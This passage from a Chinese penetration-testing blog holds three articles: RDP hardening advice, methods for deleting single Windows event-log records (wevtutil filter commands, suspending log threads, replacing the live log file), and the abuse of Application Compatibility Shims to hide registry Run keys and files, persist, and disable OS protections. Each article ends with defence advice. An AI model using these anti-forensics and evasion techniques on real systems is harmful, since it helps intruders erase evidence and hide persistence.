<h2 id="0x07-防御建议">0x07 防御建议</h2>
<hr>

<p>1.外网远程桌面服务器的安全</p>

<p>如果攻击者能够使用远程桌面协议建立通道，代表攻击者已经获得了这台服务器的权限，所以对于开放外网访问的远程桌面服务器，不仅要及时更新补丁，还要注意防范口令爆破</p>

<p>2.使用组策略禁用重定向的设备</p>

<p>组策略位置：</p>

<p><code class="language-plaintext highlighter-rouge">Computer Configuration</code>-&gt;<code class="language-plaintext highlighter-rouge">Administrative Templates</code>-&gt;<code class="language-plaintext highlighter-rouge">Windows Components</code>-&gt;<code class="language-plaintext highlighter-rouge">Remote Desktop Services</code>-&gt;<code class="language-plaintext highlighter-rouge">Remote Desktop Session Host</code>-&gt;<code class="language-plaintext highlighter-rouge">Device and Resource Redirection</code></p>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>

<p>本文参考@cpl3h的文章，对使用远程桌面协议建立通道的方法进行整理，结合自己的经验，添加个人理解，分析利用思路，总结防御建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December  5, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows单条日志的删除</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/">《渗透技巧——Windows日志的删除与绕过》</a>介绍了常见的Windows日志清除与绕过方法，但未提到单条日志的清除。</p>

<p>这一次将要结合刚刚完成的Windows XML Event Log (EVTX)单条日志清除系列文章，介绍在渗透测试中Windows XML Event Log (EVTX)单条日志清除的具体使用方法，同时结合利用思路给出防御建议</p>

<p>Windows XML Event Log (EVTX)单条日志清除系列文章地址：</p>

<ul>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%80-%E5%88%A0%E9%99%A4%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E4%BE%8B/">Windows XML Event Log (EVTX)单条日志清除（一）——删除思路与实例</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evtx%E6%96%87%E4%BB%B6%E7%9A%84%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows XML Event Log (EVTX)单条日志清除（二）——程序实现删除evtx文件的单条日志记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%89-%E9%80%9A%E8%BF%87%E8%A7%A3%E9%99%A4%E6%96%87%E4%BB%B6%E5%8D%A0%E7%94%A8%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows XML Event Log (EVTX)单条日志清除（三）——通过解除文件占用删除当前系统单条日志记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E5%9B%9B-%E9%80%9A%E8%BF%87%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows XML Event Log (EVTX)单条日志清除（四）——通过注入获取日志文件句柄删除当前系统单条日志记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%94-%E9%80%9A%E8%BF%87DuplicateHandle%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">Windows XML Event Log (EVTX)单条日志清除（五）——通过DuplicateHandle获取日志文件句柄删除当前系统单条日志记录</a></p>
  </li>
</ul>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>通过命令行获得日志信息</li>
  <li>通过命令行导出日志文件</li>
  <li>将修改后的日志文件覆盖系统原文件</li>
  <li>细节和注意点</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-通过命令行获得日志信息">0x02 通过命令行获得日志信息</h2>
<hr>

<h3 id="1获得security的最近十条日志">1、获得Security的最近十条日志</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil.exe qe Security /f:text /rd:true /c:10
</code></pre></div></div>

<h3 id="2获得security的前十条security日志">2、获得Security的前十条Security日志：</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil.exe qe Security /f:text /c:10
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>text视图不会输出<code class="language-plaintext highlighter-rouge">EventRecordID</code></p>

<p>可以通过查看xml格式获得日志对应的EventRecordID</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil.exe qe Security /f:xml /rd:true /c:10
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>默认视图为xml，所以命令可以简写为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil.exe qe Security /rd:true /c:10
</code></pre></div></div>

<p>可参考的官方说明文档：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)</p>

<h2 id="0x03-通过命令行导出日志文件">0x03 通过命令行导出日志文件</h2>
<hr>

<p>导出的日志文件可以下载到本地打开，后缀名为evtx</p>

<h3 id="1导出security所有日志并保存为1evtx">1、导出Security所有日志并保存为1.evtx</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil.exe epl Security 1.evtx
</code></pre></div></div>

<h3 id="2过滤日志并保存">2、过滤日志并保存</h3>

<h4 id="1删除单条日志并保存">(1)删除单条日志并保存</h4>

<p>删除Security下的单条日志(EventRecordID=1112)，并保存为1.evtx</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil epl Security 1.evtx "/q:*[System [(EventRecordID!=1112)]]"
</code></pre></div></div>

<h4 id="2删除多条并保存">(2)删除多条并保存</h4>

<p><strong>1. 根据EventRecordID筛选</strong></p>

<p>删除Security下的多条日志(EventRecordID为13030、13031和13032)，结果保存为1.evtx</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil epl Security 1.evtx "/q:*[System [(EventRecordID&gt;13032) or (EventRecordID&lt;13030)]]"
</code></pre></div></div>

<p><strong>2. 根据SystemTime筛选</strong></p>

<p><strong>注：</strong></p>

<p>SystemTime需要考虑时区的影响</p>

<p>通过wevtutil查询日志信息，输出格式为text时，时间未考虑时区</p>

<p>通过Windows界面查看日志信息，显示的时间也未考虑时区</p>

<p>通过wevtutil查询日志信息，输出格式为xml时，system time考虑了时区</p>

<p>举例说明：</p>

<p>通过wevtutil查询最近一条日志的时间，输出格式为text，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-3/2-1.png" alt="Alt text"></p>

<p>时间为<code class="language-plaintext highlighter-rouge">Date: 2018-08-09T20:22:20.558</code></p>

<p>通过Windows界面查看最近一条日志的时间，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-3/2-2.png" alt="Alt text"></p>

<p>时间为<code class="language-plaintext highlighter-rouge">2018-08-09T20:22:20.558</code></p>

<p>通过wevtutil查询最近一条日志的时间，输出格式为xml，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-3/2-3.png" alt="Alt text"></p>

<p>时间为<code class="language-plaintext highlighter-rouge">SystemTime='2018-08-10T03:22:20.558894400Z'</code></p>

<p>时间相隔7小时</p>

<p>所以在删除指定日期的日志时，需要查看xml格式，获得SystemTime</p>

<p>删除SystemTime为<code class="language-plaintext highlighter-rouge">2018-08-10T03:20:00</code>至<code class="language-plaintext highlighter-rouge">2018-08-10T03:21:00</code>之间的日志，结果保存为1.evtx</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil epl Security 1.evtx "/q:*[System [TimeCreated[@SystemTime &gt;'2018-08-10T03:21:00' or @SystemTime &lt;'2018-08-10T03:20:00']]]"
</code></pre></div></div>

<h2 id="0x04-将修改后的日志文件覆盖系统原文件">0x04 将修改后的日志文件覆盖系统原文件</h2>
<hr>

<p>删除了某条或是某些条日志后，需要将修改后的日志文件覆盖系统原文件</p>

<p>可采用以下三种方法</p>

<h3 id="1通过解除文件占用">1、通过解除文件占用</h3>

<p>详情可参考<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%B8%89-%E9%80%9A%E8%BF%87%E8%A7%A3%E9%99%A4%E6%96%87%E4%BB%B6%E5%8D%A0%E7%94%A8%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows XML Event Log (EVTX)单条日志清除（三）——通过解除文件占用删除当前系统单条日志记录》</a></p>

<p>实现思路如下：</p>

<ul>
  <li>结束日志进程</li>
  <li>释放日志文件句柄</li>
  <li>替换日志文件</li>
  <li>重启日志服务</li>
</ul>

<p>文中的代码需要作细微修改，修改后的代码可参考：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/DeleteRecordbyTerminateProcess(ReplaceFile).cpp</p>

<p>代码实现了结束日志进程，释放日志文件句柄，替换指定日志文件，最后重启日志服务</p>

<h3 id="2通过注入">2、通过注入</h3>

<p>详情可参考<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E5%9B%9B-%E9%80%9A%E8%BF%87%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows XML Event Log (EVTX)单条日志清除（四）——通过注入获取日志文件句柄删除当前系统单条日志记录》</a></p>

<p>实现思路如下：</p>

<h4 id="1loader">(1)Loader</h4>

<ul>
  <li>向日志进程注入dll</li>
  <li>创建三个内存映射，用于向dll传递日志文件的句柄、新日志文件的长度和新日志文件的内容</li>
  <li>释放Dll</li>
  <li>关闭内存映射</li>
</ul>

<p>可供参考的代码：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/Loader-EvtExportLog.cpp</p>

<h4 id="2dll">(2)Dll</h4>

<ul>
  <li>从内存映射读取内容，获得日志文件句柄和新日志文件的内容</li>
  <li>调用函数MapViewOfFile()将文件数据映射到进程的地址空间</li>
  <li>修改内存数据，覆盖为新日志文件的内容</li>
  <li>调用函数FlushViewOfFile()，将内存数据写入磁盘</li>
  <li>关闭日志文件的内存映射</li>
</ul>

<p>可供参考的代码：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/Dll-EvtExportLog.cpp</p>

<h3 id="3通过duplicatehandle">3、通过DuplicateHandle</h3>

<p>详情可参考<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%94-%E9%80%9A%E8%BF%87DuplicateHandle%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows XML Event Log (EVTX)单条日志清除（五）——通过DuplicateHandle获取日志文件句柄删除当前系统单条日志记录》</a></p>

<p>实现思路如下：</p>

<ul>
  <li>枚举所有进程，获得指定文件句柄</li>
  <li>通过DuplicateHandle复制句柄</li>
  <li>调用函数MapViewOfFile()将文件数据映射到进程的地址空间</li>
  <li>修改内存数据，覆盖为新日志文件的内容</li>
  <li>调用函数FlushViewOfFile()，将内存数据写入磁盘</li>
  <li>关闭日志文件的内存映射</li>
</ul>

<p>可供参考的代码：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecordbyGetHandleEx.cpp</p>

<h2 id="0x05-完整实现流程">0x05 完整实现流程</h2>
<hr>

<h3 id="1挂起日志线程使当前系统不再记录日志">1、挂起日志线程，使当前系统不再记录日志</h3>

<p>可供参考的代码：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/SuspendorResumeTid.cpp</p>

<p>代码支持三种操作，分别为suspend、resume和kill</p>

<h3 id="2过滤日志并保存-1">2、过滤日志并保存</h3>

<p>两种方法</p>

<h4 id="1通过筛选条件删除指定的日志">(1)通过筛选条件删除指定的日志</h4>

<p>方法可参考0x03的内容</p>

<p>优点：</p>

<p>简单高效</p>

<p>缺点：</p>

<p>删除指定日志后，后续日志的EventRecordID没有更新，如果逐个对比日志的EventRecordID，能够找到删除的日志个数和时间范围</p>

<h4 id="2自己实现">(2)自己实现</h4>

<p>可供参考的代码：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecordofFile.cpp</p>

<p>优点是不留痕迹</p>

<p>缺点是实现较麻烦，需要考虑多种情况多个Chunk</p>

<h3 id="3覆盖系统原日志文件">3、覆盖系统原日志文件</h3>

<p>三种方法：</p>

<h4 id="1通过解除文件占用-1">(1)通过解除文件占用</h4>

<p>某些情况下，关闭Eventlog进程和重启服务Eventlog会产生日志文件，位于system下，EventID为7034和7036</p>

<p>可选择在日志重启后立即挂起线程，避免日志被记录，可供参考的代码：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/SuspendorResumeTidEx.cpp</p>

<p>当日志进程不存在时，程序会一直等待</p>

<h4 id="2通过注入-1">(2)通过注入</h4>

<p>存在注入失败或者被拦截的情况</p>

<p>存在竞争条件导致删除失败的情况</p>

<h4 id="3通过duplicatehandle-1">(3)通过DuplicateHandle</h4>

<p>存在竞争条件导致删除失败的情况</p>

<p>综上，共介绍了<strong>2*3=6</strong>种删除单条日志的方法</p>

<p><strong>补充：</strong></p>

<p>默认配置，powershell v5.0以下，在启动powershell.exe会产生日志，位于<code class="language-plaintext highlighter-rouge">%SystemRoot%\System32\Winevt\Logs\Windows PowerShell.evtx</code></p>

<p>日志不记录具体的脚本内容，但包括powershell.exe的启动时间</p>

<p>挂起日志线程不会阻止该日志的产生</p>

<p>能够对该日志实现单条清除</p>

<p>powershell更高版本的日志绕过可参考文章：</p>

<p>https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</p>

<h3 id="4恢复日志线程恢复日志记录功能">4、恢复日志线程，恢复日志记录功能</h3>

<p>可供参考的代码：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/SuspendorResumeTid.cpp</p>

<h2 id="0x06-防御建议">0x06 防御建议</h2>
<hr>

<p>当攻击者获得了系统的完整权限后，系统的日志记录功能也会失效，可被关闭和修改</p>

<p>因此在取证上，日志不再可信，可以选择将日志定期备份到远程服务器</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了Windows XML Event Log (EVTX)单条日志清除在渗透测试中的具体使用方法，结合利用思路给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August  3, 2018
  </div>

  
</article><article class="post">
  <h1>渗透测试中的Application Compatibility Shims</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Application Compatibility是一个框架，主要用来解决应用程序在新版Windows系统上的兼容性问题。然而在渗透测试中它却有着更多的用处，本文将对公开资料进行整理，介绍在渗透测试中的具体利用技术，帮助大家更好的认识它，防御它。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<h3 id="shim">Shim：</h3>

<p>相当于是在应用程序和Windows API之间的逻辑层。</p>

<p>当应用程序创建进程的时候，WindowsLoader首先会检查sysmain.sdb（位于%windir%\AppPatch\），如果存在已注册的sdb文件，IAT将被重定向到Shim，实现功能替换。</p>

<p>本文将介绍以下内容：</p>

<ul>
  <li>创建Shim文件</li>
  <li>实际利用方法</li>
  <li>相关开源工具</li>
  <li>检测和防御</li>
</ul>

<h2 id="0x02-创建shim文件">0x02 创建Shim文件</h2>
<hr>

<h3 id="1microsoft-application-compatibility-toolkitact">1.Microsoft Application Compatibility Toolkit(ACT)</h3>

<p><strong>下载地址：</strong></p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=7352</p>

<p>默认修复方式种类个数为365</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/0-1.png" alt="Alt text"></p>

<p>启动时加入<code class="language-plaintext highlighter-rouge">/x</code>参数可获得更多修复方式，总数807</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/0-2.png" alt="Alt text"></p>

<p>根据提示创建后生成.sdb文件，需要安装使其生效</p>

<p>可在Microsoft Application Compatibility Toolkit中直接选择安装，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/1-1.png" alt="Alt text"></p>

<h2 id="0x03-实际利用方法">0x03 实际利用方法</h2>
<hr>

<h3 id="1hiding-in-the-registry">1.Hiding in the Registry</h3>

<p>选择<code class="language-plaintext highlighter-rouge">VirtualRegistry</code></p>

<p>Command line填入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ADDREDIRECT(HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run^HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHidden)
</code></pre></div></div>

<p>安装shim</p>

<p>启动regedit</p>

<p><code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>下键值无法查看,如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/0-3.png" alt="Alt text"></p>

<p>但在cmd下执行如下命令可以查看：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/0-4.png" alt="Alt text"></p>

<h3 id="2hiding-in-the-file-system">2.Hiding in the File System</h3>

<p>选择<code class="language-plaintext highlighter-rouge">CorrectFilePaths</code></p>

<p>Command line填入：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\test\;c:\users
</code></pre></div></div>

<p>Module name 填入<code class="language-plaintext highlighter-rouge">*.exe</code>,点击add</p>

<p>安装shim</p>

<p>启动cmd.exe，无法查看c:\test下的文件</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/0-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>类似的还有<code class="language-plaintext highlighter-rouge">VirtualizeDeleteFile</code> 和<code class="language-plaintext highlighter-rouge">RedirectShortcut</code></p>

<h3 id="3persistence">3.Persistence</h3>

<p>可供选择的Fix有：</p>

<ul>
  <li>InjectDll</li>
  <li>LoadLibraryRedirect</li>
  <li>RedirectShortcut</li>
  <li>RedirectEXE</li>
  <li>ShimViaEAT</li>
  <li>LoadLibraryfromCWD</li>
  <li>Hijacking DLL</li>
</ul>

<h3 id="4disable-security-features-of-the-os">4.Disable Security Features of the OS</h3>

<p>可供选择的Fix有：</p>

<ul>
  <li>Disable NX</li>
  <li>Disable ASLR</li>
  <li>DisableSEH</li>
  <li>Prevent the Loading of DLLs</li>
  <li>Disable Windows Resource Protection</li>
  <li>Elevate to Administrator</li>
  <li>DisableWindowsDefender</li>
  <li>DisableAdvancedRPCClientHardening</li>
</ul>

<p><strong>注：</strong></p>

<p>以上思路参考自：</p>

<p>http://www.irongeek.com/i.php?page=videos/derbycon3/4206-windows-0wn3d-by-default-mark-baggett</p>

<p>http://sdb.tools/files/paper.pdf</p>

<h2 id="0x04-安装和卸载shim">0x04 安装和卸载Shim</h2>
<hr>

<h3 id="1sdbinstexe">1.sdbinst.exe</h3>

<p>用来安装和卸载.sdb文件</p>

<p>微软官方提供，默认位于c:\windows\system32下，运行需要管理员权限</p>

<p><strong>usage:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> -? - print this help text.
 -p - Allow SDBs containing patches.
 -q - Quiet mode: prompts are auto-accepted.
 -u - Uninstall.
 -g {guid} - GUID of file (uninstall only).
 -n "name" - Internal name of file (uninstall only). 
</code></pre></div></div>

<p><strong>卸载：</strong></p>

<p>sdbinst.exe -u -n “name”</p>

<p>安装过程中sdbinst.exe做了如下操作：</p>

<p>在如下注册表位置创建键值保存Shim信息：</p>

<ul>
  <li>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom</li>
  <li>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB</li>
</ul>

<p>将sdb文件复制到如下文件路径：</p>

<ul>
  <li>C:\Windows\AppPatch\Custom\</li>
  <li>C:\Windows\AppPatch\Custom\Custom64\</li>
</ul>

<p>添加到已安装的应用程序列表中</p>

<p>依次打开控制面板-程序-程序和功能-卸载程序，可看到安装的Shim名称</p>

<h3 id="2sdb-explorer">2.sdb-explorer</h3>

<p><strong>下载地址：</strong></p>

<p>https://github.com/evil-e/sdb-explorer</p>

<p>同样可用来安装.sdb文件，相比于sdbinst.exe多了如下特征：</p>

<ul>
  <li>源代码开源</li>
  <li>支持In-Memory patch</li>
  <li>安装过程不将sdb文件复制到C:\Windows\AppPatch\Custom\下</li>
  <li>安装过程不在已安装的应用程序列表中显示安装的Shim名称</li>
</ul>

<p><strong>usage:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Print full sdb tree
  sdb-explorer.exe -t filename.sdb 

Print patch details
  sdb-explorer.exe [-i] -p filename.sdb (patch | patchid | patchref | patchbin)
     -i - create IDAPython Script (optional)

Print patch details for checksum
  sdb-explorer.exe [-i] -s filename.sdb

Create file containing the leaked memory
  sdb-explorer.exe -l filename.sdb

Print Match Entries
  sdb-explorer.exe -d filename.sdb

Create Patch From file
  sdb-explorer.exe -C config.dat [-o filename.sdb]

Register sdb file
  sdb-explorer.exe -r filename.sdb [-a application.exe]

Display usage
  sdb-explorer.exe -h
</code></pre></div></div>

<p>演示如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/1-2.png" alt="Alt text"></p>

<p>执行以下命令注册sdb文件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sdb-explorer.exe -r C:\Users\a\Desktop\test1.sdb -a putty.exe
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>-a的参数指定程序的名称，不能填入程序的绝对路径</p>

<p>通过sdb-explorer.exe注册的sdb文件无法通过sdbinst.exe来删除，会显示sbd文件不存在，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/1-3.png" alt="Alt text"></p>

<p>卸载可通过删除注册表键值的方式实现</p>

<p><strong>注：</strong></p>

<p>通过sdb-explorer可以创建一个In-Memory patch的shim，接着编译成sdb文件，进而安装使用，关于In-Memory patch的学习心得将在以后分享</p>

<p><strong>In-Memory patch：</strong></p>

<ul>
  <li>可以替换或写入内存中的某个区域的任意字节</li>
  <li>可用来绕过应用程序白名单</li>
</ul>

<h2 id="0x05-查看shim信息">0x05 查看Shim信息</h2>
<hr>

<h3 id="1sdb2xml">1.sdb2xml</h3>

<p>从.sdb文件提取出xml格式的数据，可用来分析sdb文件</p>

<p><strong>作者：</strong></p>

<p>Heath Stewart</p>

<p><strong>下载地址：</strong></p>

<p>https://blogs.msdn.microsoft.com/heaths/2007/11/03/shim-database-to-xml/</p>

<p><strong>usage:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sdb2xml sdb [-out report] [-base64 | -extract] [-?]

  sdb          Path to the shim database to process.
  -base64      Base-64 encode data in the XML report.
  -extract     Extract binary data to current or report directory.
  -out report  Path to the XML file to generate; otherwise, output to console.
</code></pre></div></div>

<p>如图，使用sdb2xml查看test1.sdb文件中的数据</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/2-1.png" alt="Alt text"></p>

<h3 id="2compatibility-database-dumper-cdd">2.Compatibility Database Dumper (CDD)</h3>

<p><strong>作者：</strong></p>

<p>Alex Ionesceu</p>

<p><strong>usage:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cdd.exe [-s][-e][-l][-f][-p][-d kernel-mode database file][-a usermode database file]

 -s Show shims
 -e Show executables
 -l Show layers
 -f Show flags
 -p Show patches
 -d Use Blocked Driver Database from this path
 -a Use Application Compatibility Database from this path 
</code></pre></div></div>

<p><strong>参考地址：</strong></p>

<p>http://www.alex-ionescu.com/?p=40</p>

<p>但作者Alex Ionescu目前尚未将其开源</p>

<h3 id="3shim-database-tool-sdb">3.Shim Database Tool (sdb)</h3>

<p><strong>作者：</strong></p>

<p>Jochen Kalmbach</p>

<p><strong>下载地址：</strong></p>

<p>http://blog.kalmbach-software.de/2010/02/22/the-shim-database/</p>

<p><strong>注：</strong></p>

<p>该工具源代码开源</p>

<p><strong>Usage:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sdb.exe [-noids] [-match] [PathToShimDatabse] [PathToFileName]

 -noids  Will prevent the output of the TagIds
 -match  Will match the provided file with the installed databases
         and displays the activated shims
         In this case 'PathToFileName' is required

NOTE: If no shim database path is provided,
      the default database will be used.
</code></pre></div></div>

<p>从.sdb文件提取出xml格式的数据，演示如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/2-2.png" alt="Alt text"></p>

<p>显示指定程序是否被添加Shim，如图，找到putty.exe已被添加了一个Shim，guid为<code class="language-plaintext highlighter-rouge">8F9DA6E2-5A7C-41E1-B89F8B72D63DEBA8</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-19/2-3.png" alt="Alt text"></p>

<h2 id="0x06-检测和防御">0x06 检测和防御</h2>
<hr>

<p><strong>禁用Shim的方法：</strong></p>

<ul>
  <li>
    <p>英文系统：
打开gpedit.msc，选择Administrative Templates-Windows Components-Application Compatibility-Turn off Application Compatibility Engine</p>
  </li>
  <li>
    <p>中文系统：
打开gpedit.msc，选择计算机配置-管理模板-Windows组件-应用程序兼容性-关闭应用程序兼容性引擎</p>
  </li>
</ul>

<p>但不建议关闭Shim，原因如下：</p>

<ul>
  <li>导致EMET无法使用</li>
  <li>无法更新补丁</li>
</ul>

<p><strong>检测和防御：</strong></p>

<ul>
  <li>AutoRuns不会检测到Shim</li>
  <li>Shim的安装需要管理员权限，注意权限控制</li>
  <li>监控特定注册表键值
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB</li>
  <li>注意系统中未签名的sdb文件</li>
  <li>使用检测脚本，如https://github.com/securesean/Shim-Process-Scanner和https://github.com/securesean/Shim-Process-Scanner-Lite</li>
</ul>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文对Application Compatibility Shims在渗透测试中的相关技巧做了整理，希望对大家有所帮助。对于In-Memory patch，值得研究的还有很多，学习心得将在以后分享。</p>

<p>更多关于Shim的研究资料可访问：</p>

<p>http://sdb.tools/index.html</p>

<hr>
<p><strong>本文参考链接：</strong></p>

